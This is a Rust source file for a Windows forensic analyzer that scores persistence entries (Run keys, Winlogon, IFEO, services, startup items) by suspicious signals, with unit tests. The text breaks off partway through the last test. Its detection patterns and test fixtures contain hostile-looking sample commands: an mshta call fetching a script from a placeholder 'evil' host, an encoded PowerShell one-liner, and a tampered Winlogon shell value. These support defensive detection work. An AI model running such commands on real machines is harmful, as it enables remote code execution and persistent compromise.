//! heur_persist (spec §4.2): dispositive-signal gate over persistence records. A record
//! that clears the gate (>=1 rare/dispositive signal) becomes a Finding; everything else
//! is inventory surfaced via `observe()` as an Observation (spec §6).
use crate::trust::{
    is_masquerade, is_system_or_program_files, is_user_writable_path, winlogon_value_is_default,
};
use cairn_core::finding::{EntityFile, EntityRegistry, EvidenceItem};
use cairn_core::observation::Observation;
use cairn_core::record::{ExecutionRecord, PersistenceRecord, ProcessRecord, Record};
use cairn_core::traits::Analyzer;
use cairn_core::{Entity, Finding, FindingSource, Result, Severity};
use chrono::{DateTime, Duration, Utc};
use std::collections::HashMap;

/// Days within which a LastWrite counts as "recent" (a freshly-planted persistence entry).
const RECENT_DAYS: i64 = 7;

/// One dispositive-signal hit (spec §4.2). `label` feeds the Finding title;
/// `reason` feeds Finding.reason (golden rule 6).
pub(crate) struct GateHit {
    pub severity: Severity,
    pub label: &'static str,
    pub reason: String,
    pub mitre: &'static str,
}

/// Bump one severity band (multi-signal / execution-corroboration escalation).
fn escalate(sev: Severity) -> Severity {
    match sev {
        Severity::Info => Severity::Low,
        Severity::Low => Severity::Medium,
        Severity::Medium => Severity::High,
        Severity::High | Severity::Critical => Severity::Critical,
    }
}

/// S9 (spec §4.2): persistence command invoking a script interpreter.
/// Encoded/remote content -> High; a plain local script file -> Low; else None.
/// The interpreter must be the invoked binary itself (basename of binary_path, or the
/// command's first token) — a substring match would flag "PowerShell Studio\app.exe".
fn script_persistence_signal(p: &PersistenceRecord) -> Option<GateHit> {
    const INTERPRETERS: &[&str] = &[
        "powershell.exe",
        "pwsh.exe",
        "wscript.exe",
        "cscript.exe",
        "mshta.exe",
        "cmd.exe",
        "powershell",
        "pwsh",
        "wscript",
        "cscript",
        "mshta",
        "cmd",
    ];
    let cmd = p.command.as_deref()?;
    let invoked = p
        .binary_path
        .as_deref()
        .map(|bp| short_name_persist(bp).to_ascii_lowercase())
        .or_else(|| {
            cmd.trim()
                .trim_matches('"')
                .split_whitespace()
                .next()
                .map(|t| short_name_persist(t).to_ascii_lowercase())
        })?;
    if !INTERPRETERS.contains(&invoked.as_str()) {
        return None;
    }
    let lower = cmd.to_ascii_lowercase();
    let encoded = lower.contains(" -enc")
        || lower.contains(" -encodedcommand")
        || lower.contains("frombase64string");
    let remote = lower.contains("http://") || lower.contains("https://");
    if encoded || remote {
        return Some(GateHit {
            severity: Severity::High,
            label: "腳本直譯器持久化（編碼/遠端內容）",
            reason: format!(
                "persistence command runs {invoked} with encoded or remote content: {cmd}"
            ),
            mitre: "T1059",
        });
    }
    const SCRIPT_EXTS: &[&str] = &[".vbs", ".vbe", ".js", ".jse", ".bat", ".ps1", ".hta"];
    if SCRIPT_EXTS.iter().any(|e| lower.contains(e)) {
        return Some(GateHit {
            severity: Severity::Low,
            label: "腳本檔持久化",
            reason: format!("persistence command runs {invoked} against a local script: {cmd}"),
            mitre: "T1059",
        });
    }
    None
}

/// Evaluate the dispositive-signal gate for one persistence record (spec §4.2).
/// Empty vec = no rare signal = inventory, not a detection (route to Observation).
pub(crate) fn evaluate_gate(p: &PersistenceRecord, now: DateTime<Utc>) -> Vec<GateHit> {
    let mut hits = Vec::new();
    let path = p.binary_path.as_deref().unwrap_or("");

    // S1a: winlogon value tampered (default values are inventory).
    if p.mechanism == "winlogon" {
        let is_default = p
            .value
            .as_deref()
            .zip(p.command.as_deref())
            .is_some_and(|(v, c)| winlogon_value_is_default(v, c));
        if !is_default {
            hits.push(GateHit {
                severity: Severity::High,
                label: "Winlogon 遭篡改",
                reason: format!(
                    "Winlogon {} is not the stock default: {}",
                    p.value.as_deref().unwrap_or("?"),
                    p.command.as_deref().unwrap_or("-")
                ),
                mitre: "T1547.004",
            });
        }
    }

    // S1b: IFEO debugger — always gates (rare); severity by target trust.
    if p.mechanism == "ifeo" {
        let untrusted = p.signed == Some(false) || is_user_writable_path(path);
        hits.push(GateHit {
            severity: if untrusted {
                Severity::High
            } else {
                Severity::Medium
            },
            label: "IFEO debugger 挾持",
            reason: format!(
                "IFEO Debugger set ({}); target {}",
                p.location,
                if untrusted {
                    "unsigned or in a user-writable path"
                } else {
                    "signed, system/vendor path (Process Explorer-style use)"
                }
            ),
            mitre: "T1546.012",
        });
    }

    // The Startup folder (%APPDATA%\...\Startup or the all-users ProgramData twin) IS the
    // persistence location itself, not an arbitrary drop zone — every mechanism's binary_path
    // signal (S2/S3/S4) assumes the path is where an attacker CHOSE to hide the binary. For
    // `startup`, Windows already put it in ProgramData/AppData by design, so those same
    // path-trust checks would flag every legitimate startup shortcut (e.g. AnyDesk.lnk).
    // Mirrors the pre-gate model's `mechanism != "startup"` path-signal exemption.
    let path_signals_apply = p.mechanism != "startup";

    // S2: explicitly unsigned + user-writable drop zone.
    if path_signals_apply && p.signed == Some(false) && is_user_writable_path(path) {
        hits.push(GateHit {
            severity: Severity::High,
            label: "未簽章執行檔於使用者可寫路徑",
            reason: format!(
                "binary is explicitly unsigned and lives in a user-writable drop zone: {path}"
            ),
            mitre: "T1036",
        });
    }

    // S3: system-name masquerade (absolute path outside C:\Windows).
    if path_signals_apply && is_masquerade(path) {
        hits.push(GateHit {
            severity: Severity::High,
            label: "系統程式名稱偽裝",
            reason: format!("system binary name at a non-Windows location: {path}"),
            mitre: "T1036.005",
        });
    }

    // S4: recent + unverifiable + outside system/vendor dirs — all three required.
    // Recency ALONE is dead (update-day mass rewrites, per-user service instances).
    if path_signals_apply
        && p.signed.is_none()
        && !path.is_empty()
        && !is_system_or_program_files(path)
    {
        if let Some(lw) = p.last_write {
            let age = now.signed_duration_since(lw);
            if age >= Duration::zero() && age <= Duration::days(RECENT_DAYS) {
                hits.push(GateHit {
                    severity: Severity::Medium,
                    label: "近期建立且簽章無法驗證",
                    reason: format!(
                        "created/modified within {RECENT_DAYS} days, signature unverifiable, non-system path: {path}"
                    ),
                    mitre: "T1547",
                });
            }
        }
    }

    // S9: script-interpreter persistence.
    if let Some(hit) = script_persistence_signal(p) {
        hits.push(hit);
    }

    hits
}

/// 跨文物比對鍵：有完整路徑（含目錄分隔符）就用正規化後的完整路徑比對；
/// 只有檔名（來源本身缺路徑資訊，如多數 prefetch 條目、srum 的 "id:<n>" 回退）
/// 就降級成純檔名比對。降級佐證的信心度低於完整路徑相符，呼叫端在組
/// finding reason 時必須標註「降級佐證」（見 gate_details 呼叫處）。
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
enum JoinKey {
    /// 正規化（trim + 去引號 + 小寫）後的完整路徑，含目錄。
    Path(String),
    /// 僅檔名（去 `.exe` 尾綴），來源缺路徑資訊。
    Name(String),
}

impl JoinKey {
    /// 兩個 JoinKey 是否應視為同一佐證目標：Path 對 Path 要求完全相同；
    /// 任一方是 Name（降級）就退回比對雙方的 basename。
    fn degraded_key(&self) -> String {
        match self {
            JoinKey::Path(p) => basename_from_normalized(p),
            JoinKey::Name(n) => n.clone(),
        }
    }
}

/// 從一個原始路徑/檔名字串建立 JoinKey：trim + 去引號 + 小寫，再判斷是否含
/// 目錄分隔符（`\` 或 `/`）。不含分隔符（如純檔名、或 srum 的 "id:42" 回退）
/// 一律視為 Name（降級）鍵。
fn join_key(raw: &str) -> JoinKey {
    let normalized = raw.trim().trim_matches('"').to_ascii_lowercase();
    if normalized.contains('\\') || normalized.contains('/') {
        JoinKey::Path(normalized)
    } else {
        JoinKey::Name(strip_exe_suffix(&normalized))
    }
}

/// 從一個已正規化（小寫、trim 過）的完整路徑取出檔名（去 `.exe` 尾綴）。
fn basename_from_normalized(path: &str) -> String {
    let base = path.rsplit(['\\', '/']).next().unwrap_or(path);
    strip_exe_suffix(base)
}

/// 去掉 `.exe` 尾綴（若有）。
fn strip_exe_suffix(s: &str) -> String {
    s.strip_suffix(".exe")
        .map(String::from)
        .unwrap_or_else(|| s.to_string())
}

/// Index execution + process records for corroboration lookups. 用兩層索引：
/// exact（JoinKey 完全相等，Path 對 Path 或 Name 對 Name 且字串相同）對**所有**
/// 記錄建立；degraded（純 basename）**只**收「來源本身就缺路徑資訊」的記錄
/// （`JoinKey::Name`，如 prefetch 檔名、srum 的 `id:<n>` 回退）——有完整路徑的
/// 記錄（`JoinKey::Path`）不會被放進 degraded 索引。查詢端不論自己是 `Path`
/// 還是 `Name`，exact 沒命中時都會查 degraded；但因為 degraded 索引本身只裝得
/// 下缺路徑的記錄，兩個「都有完整路徑、只是目錄不同」的記錄永遠不會在
/// degraded 裡相遇——不會重現 F-2 的同名誤判。
struct CrossIndex<'a> {
    exec_exact: HashMap<JoinKey, Vec<&'a ExecutionRecord>>,
    exec_degraded: HashMap<String, Vec<&'a ExecutionRecord>>,
    proc_exact: HashMap<JoinKey, Vec<&'a ProcessRecord>>,
    proc_degraded: HashMap<String, Vec<&'a ProcessRecord>>,
}

impl<'a> CrossIndex<'a> {
    /// 查找 exec 佐證：先試 exact key；沒命中時查 degraded（僅檔名）索引。
    /// degraded 索引只收「來源缺路徑」的記錄（`JoinKey::Name`，如 prefetch），
    /// 所以即使查詢端是 `Path`（如 run_key 的完整 binary_path），也只會匹配
    /// 到同樣缺路徑的一方，不會匹配到另一個同 basename 但目錄不同的完整路徑
    /// 記錄（那種記錄根本沒被放進 degraded 索引）。回傳 (命中清單, 是否為
    /// 降級命中)。
    fn lookup_exec(&self, key: &JoinKey) -> (Vec<&'a ExecutionRecord>, bool) {
        if let Some(hits) = self.exec_exact.get(key) {
            if !hits.is_empty() {
                return (hits.clone(), false);
            }
        }
        match self.exec_degraded.get(&key.degraded_key()) {
            Some(hits) if !hits.is_empty() => (hits.clone(), true),
            _ => (Vec::new(), false),
        }
    }

    /// 同 lookup_exec，查 process 側。
    fn lookup_proc(&self, key: &JoinKey) -> (Vec<&'a ProcessRecord>, bool) {
        if let Some(hits) = self.proc_exact.get(key) {
            if !hits.is_empty() {
                return (hits.clone(), false);
            }
        }
        match self.proc_degraded.get(&key.degraded_key()) {
            Some(hits) if !hits.is_empty() => (hits.clone(), true),
            _ => (Vec::new(), false),
        }
    }
}

fn build_cross_index(records: &[Record]) -> CrossIndex<'_> {
    let mut exec_exact: HashMap<JoinKey, Vec<&ExecutionRecord>> = HashMap::new();
    let mut exec_degraded: HashMap<String, Vec<&ExecutionRecord>> = HashMap::new();
    let mut proc_exact: HashMap<JoinKey, Vec<&ProcessRecord>> = HashMap::new();
    let mut proc_degraded: HashMap<String, Vec<&ProcessRecord>> = HashMap::new();
    for r in records {
        match r {
            Record::Execution(e) => {
                let k = join_key(&e.path);
                if !k.degraded_key().is_empty() {
                    if let JoinKey::Name(n) = &k {
                        exec_degraded.entry(n.clone()).or_default().push(e);
                    }
                    exec_exact.entry(k).or_default().push(e);
                }
            }
            Record::Process(p) => {
                let k = join_key(&p.image);
                if !k.degraded_key().is_empty() {
                    if let JoinKey::Name(n) = &k {
                        proc_degraded.entry(n.clone()).or_default().push(p);
                    }
                    proc_exact.entry(k).or_default().push(p);
                }
            }
            _ => {}
        }
    }
    CrossIndex {
        exec_exact,
        exec_degraded,
        proc_exact,
        proc_degraded,
    }
}

/// Return the bare file name from a command/path string (strips surrounding quotes too).
fn short_name_persist(path: &str) -> String {
    path.trim_matches('"')
        .rsplit(['\\', '/'])
        .next()
        .unwrap_or(path)
        .to_owned()
}

/// details starts with the FULL PATH (the investigator's first question), single line,
/// " | " separated — CSV-safe, readable without expanding the HTML row (spec §7.2).
fn gate_details(p: &PersistenceRecord) -> String {
    let path = p
        .binary_path
        .as_deref()
        .filter(|s| !s.is_empty())
        .unwrap_or(&p.location);
    let sig = match p.signed {
        Some(true) => match p.signer.as_deref() {
            Some(s) => format!("已簽章 ({s})"),
            None => "已簽章".into(),
        },
        Some(false) => "未簽章".into(),
        None => "簽章無法驗證".into(),
    };
    let lw = p
        .last_write
        .map(|t| t.format("%Y-%m-%d").to_string())
        .unwrap_or_else(|| "unknown".into());
    format!(
        "{path} | {mech}: {loc}{val} | {sig} | last_write={lw}",
        mech = p.mechanism,
        loc = p.location,
        val = p
            .value
            .as_deref()
            .map(|v| format!(" → {v}"))
            .unwrap_or_default(),
    )
}

/// Evidence for the persistence entry itself.
fn persistence_evidence(p: &PersistenceRecord) -> EvidenceItem {
    EvidenceItem {
        artifact: p.mechanism.clone(),
        path: p.binary_path.clone(),
        ts: p.last_write,
        detail: format!(
            "{}: {} = {}",
            p.location,
            p.value.as_deref().unwrap_or("-"),
            p.command.as_deref().unwrap_or("-")
        ),
    }
}

/// Evidence rows from execution artifacts (honest about prefetch's filename-only path).
fn execution_evidence(entries: &[&ExecutionRecord]) -> Vec<EvidenceItem> {
    entries
        .iter()
        .map(|e| {
            let mut detail = format!(
                "{}: run_count={} last_run={}",
                e.source,
                e.run_count
                    .map(|c| c.to_string())
                    .unwrap_or_else(|| "?".into()),
                e.last_run
                    .map(|t| t.format("%Y-%m-%dT%H:%M:%SZ").to_string())
                    .unwrap_or_else(|| "unknown".into()),
            );
            if e.source == "prefetch" {
                detail.push_str("（prefetch 僅記錄檔名，完整路徑見 shimcache/amcache 條目）");
            }
            EvidenceItem {
                artifact: e.source.clone(),
                path: Some(e.path.clone()),
                ts: e.last_run.or(e.first_run),
                detail,
            }
        })
        .collect()
}

/// Total order over Severity for max-selection (Severity itself has no Ord).
fn sev_rank(s: Severity) -> u8 {
    match s {
        Severity::Critical => 4,
        Severity::High => 3,
        Severity::Medium => 2,
        Severity::Low => 1,
        Severity::Info => 0,
    }
}

/// Analyzer: ranks persistence records, emitting findings above the noise floor.
pub struct PersistHeuristic;

impl Analyzer for PersistHeuristic {
    fn name(&self) -> &str {
        "heur_persist"
    }

    fn analyze(&self, records: &[Record]) -> Result<Vec<Finding>> {
        // NOTE: `observe()` below independently samples its own `now`. The orchestrator
        // calls analyze() then observe() as two separate trait-method calls, so these two
        // timestamps can differ by however long analysis takes. S4's 7-day recency gate
        // is the only signal sensitive to `now`; a record whose age crosses exactly the
        // 7-day boundary during that gap could in theory appear in BOTH findings and
        // observations (or neither). Sharing one timestamp would require threading `now`
        // through the Analyzer trait signature for all six analyzers — out of proportion
        // to a sub-second race on a 7-day window. Accepted residual risk (see
        // docs/REMAINING-WORK.md).
        let now = Utc::now();
        let idx = build_cross_index(records);
        let mut out = Vec::new();
        for r in records {
            let Record::Persistence(p) = r else { continue };
            let hits = evaluate_gate(p, now);
            if hits.is_empty() {
                continue; // inventory — surfaces via observe()
            }

            // Severity: max of hits; >=2 signals escalate once; execution/process
            // corroboration escalates once more (spec §4.1/§4.3). Cap: Critical.
            let mut sev = hits
                .iter()
                .map(|h| h.severity)
                .max_by_key(|s| sev_rank(*s))
                .unwrap_or(Severity::Low);
            let mut reasons: Vec<String> = hits.iter().map(|h| h.reason.clone()).collect();
            if hits.len() >= 2 {
                sev = escalate(sev);
                reasons.push(format!("{} independent signals — escalated", hits.len()));
            }

            let key = join_key(
                p.binary_path
                    .as_deref()
                    .or(p.command.as_deref())
                    .unwrap_or(""),
            );
            let mut evidence = vec![persistence_evidence(p)];
            let (exec_hits, exec_degraded) = idx.lookup_exec(&key);
            let (proc_hits, proc_degraded) = idx.lookup_proc(&key);
            if !exec_hits.is_empty() || !proc_hits.is_empty() {
                sev = escalate(sev);
                let mut corr = Vec::new();
                let mut any_degraded = false;
                if !exec_hits.is_empty() {
                    corr.push(format!("executed ({} artifact records)", exec_hits.len()));
                    evidence.extend(execution_evidence(&exec_hits));
                    any_degraded |= exec_degraded;
                }
                for pr in &proc_hits {
                    corr.push(format!("currently running (pid={})", pr.pid));
                    evidence.push(EvidenceItem {
                        artifact: "process".into(),
                        path: Some(pr.image.clone()),
                        ts: pr.start_time,
                        detail: format!("running pid={} image={}", pr.pid, pr.image),
                    });
                }
                any_degraded |= !proc_hits.is_empty() && proc_degraded;
                let suffix = if any_degraded {
                    "（降級佐證：僅檔名相符，來源缺完整路徑）"
                } else {
                    ""
                };
                reasons.push(format!(
                    "corroborated: {} — escalated{suffix}",
                    corr.join("; ")
                ));
            }

            let top = hits
                .iter()
                .max_by_key(|h| sev_rank(h.severity))
                .unwrap_or(&hits[0]);
            let short = short_name_persist(
                p.binary_path
                    .as_deref()
                    .or(p.command.as_deref())
                    .unwrap_or(&p.location),
            );
            let mut f = Finding::new(
                sev,
                format!("{}: {short}", top.label),
                FindingSource::Heuristic,
            );
            f.reason = Some(reasons.join("; "));
            f.mitre = {
                let mut m: Vec<String> = hits.iter().map(|h| h.mitre.to_string()).collect();
                m.dedup();
                m
            };
            f.artifact = "persistence".into();
            f.details = gate_details(p);
            f.ts = p.last_write.unwrap_or(now);
            f.entity = persistence_entity(p);
            f.evidence = evidence;
            out.push(f);
        }
        Ok(out)
    }

    fn observe(&self, records: &[Record]) -> Result<Vec<Observation>> {
        let now = Utc::now();
        let mut out = Vec::new();
        for r in records {
            let Record::Persistence(p) = r else { continue };
            if !evaluate_gate(p, now).is_empty() {
                continue; // gated items are findings, not inventory
            }
            let category = if p.mechanism == "winlogon" {
                "winlogon_default".to_string()
            } else {
                p.mechanism.clone()
            };
            let short = short_name_persist(
                p.binary_path
                    .as_deref()
                    .or(p.command.as_deref())
                    .unwrap_or(&p.location),
            );
            let mut o = Observation::new(category, format!("{}: {short}", p.mechanism));
            o.ts = p.last_write.unwrap_or(now);
            o.path = p.binary_path.clone();
            o.details = gate_details(p);
            o.source_artifact = "persistence".into();
            out.push(o);
        }
        Ok(out)
    }
}

/// Build the entity: registry-backed mechanisms -> entity.registry; the file-backed
/// `startup` mechanism -> entity.file (SRS §5.1 mapping in the design spec).
fn persistence_entity(p: &PersistenceRecord) -> Entity {
    if p.mechanism == "startup" {
        Entity {
            file: Some(EntityFile {
                path: p
                    .binary_path
                    .clone()
                    .or_else(|| p.value.clone())
                    .unwrap_or_default(),
                sha256: None,
                mtime: p.last_write,
                si_btime: None,
                fn_btime: None,
                si_mtime: None,
                fn_mtime: None,
                path_complete: None,
            }),
            ..Entity::default()
        }
    } else {
        Entity {
            registry: Some(EntityRegistry {
                hive: hive_prefix(&p.location),
                key: p.location.clone(),
                value: p.value.clone().unwrap_or_default(),
                data: p.command.clone().unwrap_or_default(),
                last_write: p.last_write,
            }),
            ..Entity::default()
        }
    }
}

/// Parse the hive prefix ("HKLM"/"HKCU"/...) from a registry location string; "" if none.
fn hive_prefix(location: &str) -> String {
    location
        .split(['\\', '/'])
        .next()
        .filter(|h| h.starts_with("HK"))
        .unwrap_or("")
        .to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rec(
        mechanism: &str,
        binary_path: Option<&str>,
        last_write: Option<DateTime<Utc>>,
    ) -> PersistenceRecord {
        PersistenceRecord {
            mechanism: mechanism.into(),
            location: "HKLM\\...\\Run".into(),
            value: Some("Updater".into()),
            command: binary_path.map(|p| p.to_string()),
            binary_path: binary_path.map(|p| p.to_string()),
            binary_sha256: None,
            signed: None,
            signer: None,
            last_write,
        }
    }

    use cairn_core::record::Record;
    use cairn_core::traits::Analyzer;

    /// The analyzer emits one Heuristic finding for a malicious IFEO record (reason +
    /// registry entity) and nothing for a quiet old Run key.
    #[test]
    fn analyzer_emits_finding_for_malicious_only() {
        let now = Utc::now();
        let bad = Record::Persistence(rec(
            "ifeo",
            Some(r"C:\Users\a\AppData\Local\Temp\dbg.exe"),
            Some(now),
        ));
        let quiet = Record::Persistence(rec(
            "run_key",
            Some(r"C:\Program Files\V\a.exe"),
            Some(now - Duration::days(400)),
        ));
        let findings = PersistHeuristic.analyze(&[bad, quiet]).expect("analyze");
        assert_eq!(findings.len(), 1);
        let f = &findings[0];
        assert!(matches!(f.source, cairn_core::FindingSource::Heuristic));
        assert!(f.reason.is_some());
        assert_eq!(f.artifact, "persistence");
        assert!(f.entity.registry.is_some(), "ifeo is registry-backed");
        assert!(f.mitre.contains(&"T1546.012".to_string()));
    }

    /// A startup (file) mechanism populates entity.file, not entity.registry.
    /// Uses an S9 script-persistence signal (not a path signal) to clear the gate,
    /// since startup is deliberately exempt from S2/S3/S4 path-trust checks (the
    /// Startup folder IS the persistence location, not a suspicious drop zone).
    #[test]
    fn startup_mechanism_uses_file_entity() {
        let now = Utc::now();
        let r = PersistenceRecord {
            mechanism: "startup".into(),
            location: r"C:\Users\a\...\Startup".into(),
            value: Some("Updater".into()),
            command: Some("powershell.exe -NoP -Enc SQBFAFgA".into()),
            binary_path: None,
            binary_sha256: None,
            signed: None,
            signer: None,
            last_write: Some(now),
        };
        let findings = PersistHeuristic
            .analyze(&[Record::Persistence(r)])
            .expect("analyze");
        assert_eq!(findings.len(), 1);
        let f = &findings[0];
        assert!(f.entity.file.is_some());
        assert!(f.entity.registry.is_none());
    }

    // ── gate model (spec §4.2) ───────────────────────────────────────────────
    fn full_rec(
        mechanism: &str,
        value: Option<&str>,
        command: Option<&str>,
        binary_path: Option<&str>,
        signed: Option<bool>,
        last_write: Option<DateTime<Utc>>,
    ) -> PersistenceRecord {
        PersistenceRecord {
            mechanism: mechanism.into(),
            location: format!("HKLM\\...\\{mechanism}"),
            value: value.map(String::from),
            command: command.map(String::from),
            binary_path: binary_path.map(String::from),
            binary_sha256: None,
            signed,
            signer: None,
            last_write,
        }
    }

    #[test]
    fn gate_s1a_winlogon_tamper_high_default_silent() {
        let now = Utc::now();
        let tampered = full_rec(
            "winlogon",
            Some("Shell"),
            Some("explorer.exe,evil.exe"),
            None,
            None,
            None,
        );
        let hits = evaluate_gate(&tampered, now);
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].severity, Severity::High);
        assert_eq!(hits[0].mitre, "T1547.004");
        let stock = full_rec(
            "winlogon",
            Some("Shell"),
            Some("explorer.exe"),
            Some(r"C:\Windows\explorer.exe"),
            Some(true),
            Some(now),
        );
        assert!(
            evaluate_gate(&stock, now).is_empty(),
            "stock winlogon must be inventory"
        );
    }

    #[test]
    fn gate_s1b_ifeo_severity_by_target_trust() {
        let now = Utc::now();
        let evil = full_rec(
            "ifeo",
            Some("Debugger"),
            Some(r"C:\Users\a\AppData\Roaming\d.exe"),
            Some(r"C:\Users\a\AppData\Roaming\d.exe"),
            Some(false),
            None,
        );
        assert!(evaluate_gate(&evil, now)
            .iter()
            .any(|h| h.severity == Severity::High));
        let procexp = full_rec(
            "ifeo",
            Some("Debugger"),
            Some(r"C:\Program Files\SysInternals\procexp.exe"),
            Some(r"C:\Program Files\SysInternals\procexp.exe"),
            Some(true),
            None,
        );
        let hits = evaluate_gate(&procexp, now);
        assert_eq!(hits.len(), 1, "IFEO always gates");
        assert_eq!(
            hits[0].severity,
            Severity::Medium,
            "signed vendor target -> Medium"
        );
    }

    #[test]
    fn gate_s2_unsigned_dropzone_high_but_signed_or_normal_path_silent() {
        let now = Utc::now();
        let evil = full_rec(
            "run_key",
            Some("Upd"),
            Some(r"C:\Users\a\AppData\Roaming\e.exe"),
            Some(r"C:\Users\a\AppData\Roaming\e.exe"),
            Some(false),
            None,
        );
        assert_eq!(evaluate_gate(&evil, now)[0].severity, Severity::High);
        // signed chrome autostart -> inventory
        let chrome = full_rec(
            "run_key",
            Some("Chrome"),
            Some(r"C:\Users\a\AppData\Local\Google\Chrome\chrome.exe"),
            Some(r"C:\Users\a\AppData\Local\Google\Chrome\chrome.exe"),
            Some(true),
            Some(now),
        );
        assert!(evaluate_gate(&chrome, now).is_empty());
        // unsigned but in Program Files (admin-write) -> not S2
        let pf = full_rec(
            "run_key",
            Some("V"),
            Some(r"C:\Program Files\V\v.exe"),
            Some(r"C:\Program Files\V\v.exe"),
            Some(false),
            None,
        );
        assert!(evaluate_gate(&pf, now).is_empty());
    }

    /// The Startup folder IS the persistence location, not a suspicious drop zone —
    /// S2/S3/S4's path-trust checks must not fire on it (real-machine e2e regression:
    /// AnyDesk.lnk in the all-users ProgramData Startup folder, unsigned .lnk, recent
    /// last_write — previously fired S2 as a false positive).
    #[test]
    fn gate_startup_mechanism_exempt_from_path_signals() {
        let now = Utc::now();
        let startup_shortcut = full_rec(
            "startup",
            None,
            Some(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\AnyDesk.lnk"),
            Some(r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\AnyDesk.lnk"),
            Some(false),
            Some(now),
        );
        assert!(
            evaluate_gate(&startup_shortcut, now).is_empty(),
            "startup mechanism must be exempt from S2/S3/S4 path-trust checks"
        );
    }

    #[test]
    fn gate_s3_masquerade_absolute_only() {
        let now = Utc::now();
        let fake = full_rec(
            "service",
            None,
            Some(r"C:\ProgramData\svchost.exe"),
            Some(r"C:\ProgramData\svchost.exe"),
            None,
            None,
        );
        assert!(evaluate_gate(&fake, now)
            .iter()
            .any(|h| h.mitre == "T1036.005"));
        let bare = full_rec(
            "winlogon",
            Some("Shell"),
            Some("explorer.exe"),
            Some("explorer.exe"),
            None,
            None,
        );
        // bare name: winlogon default -> no S1a; not absolute -> no S3
        assert!(evaluate_gate(&bare, now).is_empty());
    }

    #[test]
    fn gate_s4_needs_all_three_conditions() {
        let now = Utc::now();
        let recent = Some(now - Duration::days(2));
        let hit = full_rec(
            "service",
            None,
            Some(r"C:\Tools\agent.exe"),
            Some(r"C:\Tools\agent.exe"),
            None,
            recent,
        );
        assert_eq!(evaluate_gate(&hit, now)[0].severity, Severity::Medium);
        // signed -> no S4 (ASUS update-day services)
        let signed = full_rec(
            "service",
            None,
            Some(r"C:\Tools\agent.exe"),
            Some(r"C:\Tools\agent.exe"),
            Some(true),
            recent,
        );
        assert!(evaluate_gate(&signed, now).is_empty());
        // system path -> no S4 (per-user svchost instances)
        let sys = full_rec(
            "service",
            None,
            Some(r"C:\Windows\System32\svchost.exe -k X"),
            Some(r"C:\Windows\System32\svchost.exe"),
            None,
            recent,
        );
        assert!(evaluate_gate(&sys, now).is_empty());
        // old -> no S4
        let old = full_rec(
            "service",
            None,
            Some(r"C:\Tools\agent.exe"),
            Some(r"C:\Tools\agent.exe"),
            None,
            Some(now - Duration::days(300)),
        );
        assert!(evaluate_gate(&old, now).is_empty());
    }

    #[test]
    fn gate_s9_script_persistence_tiers() {
        let now = Utc::now();
        let enc = full_rec(
            "run_key",
            Some("U"),
            Some("powershell.exe -NoP -Enc SQBFAFgA"),
            None,
            None,
            None,
        );
        let h = evaluate_gate(&enc, now);
        assert_eq!(h[0].severity, Severity::High);
        let remote = full_rec(
            "run_key",
            Some("U"),
            Some(r"mshta.exe https://evil.tld/x.hta"),
            None,
            None,
            None,
        );
        assert_eq!(evaluate_gate(&remote, now)[0].severity, Severity::High);
        let local = full_rec(
            "scheduled_task",
            None,
            Some(r"wscript.exe C:\Scripts\backup.vbs"),
            Some(r"C:\Windows\System32\wscript.exe"),
            Some(true),
            None,
        );
        assert_eq!(evaluate_gate(&local, now)[0].severity, Severity::Low);
        // interpreter-in-vendor-name must NOT fire (substring guard)
        let studio = full_rec(
            "run_key",
            Some("PS"),
            Some(r"C:\Program Files\PowerShell Studio\app.exe --serve"),
            Some(r"C:\Program Files\PowerShell Studio\app.exe"),
            Some(true),
            None,
        );
        assert!(evaluate_gate(&studio, now).is_empty());
    }

    #[test]
    fn gate_service_and_runkey_existence_is_inventory() {
        let now = Utc::now();
        // The 25-Low class from the 2026-06-28 run: plain third-party service.
        let svc = full_rec(
            "service",
            None,
            Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
            Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
            Some(true),
            Some(now - Duration::days(400)),
        );
        assert!(evaluate_gate(&svc, now).is_empty());
        // The 13-Medium class: same service on update day (recent) — still inventory.
        let svc_recent = full_rec(
            "service",
            None,
            Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
            Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
            Some(true),
            Some(now - Duration::days(2)),
        );
        assert!(evaluate_gate(&svc_recent, now).is_empty());
    }

    #[test]
    fn escalate_caps_at_critical() {
        assert_eq!(escalate(Severity::Low), Severity::Medium);
        assert_eq!(escalate(Severity::Medium), Severity::High);
        assert_eq!(escalate(Severity::High), Severity::Critical);
        assert_eq!(escalate(Severity::Critical), Severity::Critical);
    }

    // ── analyze/observe split + cross-artifact corroboration ────────────────

    fn wrap(p: PersistenceRecord) -> Record {
        Record::Persistence(p)
    }

    #[test]
    fn analyze_emits_only_gated_and_observe_gets_the_rest() {
        let now = Utc::now();
        let records = vec![
            wrap(full_rec(
                "run_key",
                Some("Upd"),
                Some(r"C:\Users\a\AppData\Roaming\e.exe"),
                Some(r"C:\Users\a\AppData\Roaming\e.exe"),
                Some(false),
                Some(now),
            )),
            wrap(full_rec(
                "service",
                None,
                Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
                Some(r"C:\Program Files\ASUS\AsusAppService.exe"),
                Some(true),
                Some(now),
            )),
        ];
        let findings = PersistHeuristic.analyze(&records).unwrap();
        assert_eq!(findings.len(), 1, "only the S2 hit is a finding");
        assert_eq!(findings[0].severity, Severity::High);
        let obs = PersistHeuristic.observe(&records).unwrap();
        assert_eq!(obs.len(), 1, "the clean service is inventory");
        assert_eq!(obs[0].category, "service");
    }

    #[test]
    fn execution_corroboration_escalates_and_adds_evidence() {
        use cairn_core::record::ExecutionRecord;
        let now = Utc::now();
        let records = vec![
            wrap(full_rec(
                "run_key",
                Some("U"),
                Some(r"C:\Users\a\AppData\Roaming\e.exe"),
                Some(r"C:\Users\a\AppData\Roaming\e.exe"),
                Some(false),
                Some(now),
            )),
            Record::Execution(ExecutionRecord {
                source: "prefetch".into(),
                path: "E.EXE".into(),
                first_run: None,
                last_run: Some(now),
                run_count: Some(3),
                sha1: None,
                user_sid: None,
                execution_confirmed: Some(true),
            }),
        ];
        let findings = PersistHeuristic.analyze(&records).unwrap();
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].severity,
            Severity::Critical,
            "S2 High + exec corroboration"
        );
